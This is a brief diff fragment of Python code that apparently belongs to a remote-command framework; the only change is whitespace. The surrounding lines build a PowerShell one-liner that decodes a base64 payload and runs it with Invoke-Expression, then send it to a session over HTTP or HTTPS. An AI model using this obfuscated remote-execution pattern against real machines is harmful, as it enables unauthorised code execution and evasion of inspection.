@@ -140,7 +140,7 @@ foreach ($u in $users) {{
 			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
 			"Invoke-Expression $ps"
 		)
-	
+
 		if transport in ("http", "https"):
 			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)
 
